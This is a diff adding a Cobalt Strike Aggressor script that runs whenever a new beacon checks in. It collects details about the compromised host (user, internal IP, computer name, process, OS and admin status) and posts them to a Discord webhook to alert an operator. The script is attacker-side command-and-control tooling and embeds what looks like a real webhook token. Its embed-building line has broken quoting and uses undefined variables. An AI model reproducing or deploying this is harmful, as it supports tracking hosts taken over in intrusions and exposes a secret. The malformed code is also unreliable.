@@ -1,0 +1,56 @@
+on beacon_initial {
+    local('$b $bid $bListener $bUser $bIntIP $bName $bProc $bArch $bOs $bVer');
+    global('$notify');
+    
+    # If incoming beacon is admin, call it out in event log
+    if (-isadmin $1) {
+        # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
+        $b = bdata($1);
+    }
+
+    # Get Windows version and set Beacon note
+    getVersion($1);
+
+    # If notifications are turned on, notify when we get a new beacon
+    if ($notify == 1) {
+
+        # Beacon information
+        $bid        = $1;
+        $bListener  = binfo($bid, 'listener');
+        $bUser      = binfo($bid, 'user');
+        $bIntIP     = binfo($bid, 'host');
+        $bName      = binfo($bid, 'computer');
+        $bProc      = binfo($bid, 'process');
+        $bArch      = binfo($bid, 'arch');
+        $bOs        = binfo($bid, 'os');
+        $bVer       = binfo($bid, 'ver');
+        
+        # Check if the beacon is an admin beacon
+        if (-isadmin $bid) {
+            $bAdmin = "True";
+            elog("\c5New admin beacon: \c2" . $bUser . "@" . $bName . "\c5!\o");
+        }
+        else {
+            $bAdmin = "False";
+        }
+
+        # Role to notify
+        $notifyWho = '<@&807110593492287499>';
+
+        # Webhook URL to send the notifications to
+        $webhookURL = 'https://discordapp.com/api/webhooks/806419146589470740/wi6KHgPeFTL_nWEkaAH9dnOruGh4fu6SHXjD_dy3R0taqjE8LWFas5lPOCXsRYqp35x-';
+        
+        # Create the message
+        $msg = "New Beacon: " . $bUser . "@" . $bIntIP . " (". $bName . ")";
+        
+        # Create the embed
+        $embed = {"fields":[{"name": "Notify","value": "'. $notifyWho .'"},{"name": "Teamserver","value": "'. $teamserver .'","inline": true},{"name": "Timestamp","value": "'. $timestamp .'","inline": true},{"name": "OS Info","value": "'. $bOs . " " . $bVer . " (" . $bArch . ") " .'","inline": true},{"name": "Listener","value": "'. $bListener .'"},{"name": "Process","value": "'. $bProc . '","inline": true},{"name": "Is Admin","value": "'. $bAdmin . '","inline": true},{"name": "Message","value": "' . $msg . '"}]};
+
+        # println($webhookURL);
+        # println($msg);
+        # println($embed);
+
+        # Send the message
+        sendDiscordMessage($webhookURL, $embed);
+    }
+}
